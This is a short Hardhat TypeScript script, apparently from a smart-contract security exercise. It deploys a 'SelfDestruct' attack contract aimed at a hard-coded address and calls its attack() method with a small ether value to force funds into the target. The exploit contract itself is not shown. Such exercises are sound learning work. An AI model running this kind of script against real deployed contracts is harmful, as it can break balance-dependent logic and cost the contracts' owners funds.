// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { parseEther } from "ethers/lib/utils";
import { ethers } from "hardhat";

async function main() {
  // Deploy the Attack contract
  const SelfDestruct = await ethers.getContractFactory(
    "SelfDestruct"
  );
  const selfDestruct = await SelfDestruct.deploy("0x96E9B44E86E0BAff05000F2238b2c84009F9Dec3");
  await selfDestruct.deployed();

  // self destruct
  const attackTx = await selfDestruct.attack({
    value: parseEther("0.0001")
  })
  attackTx.wait(1)

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
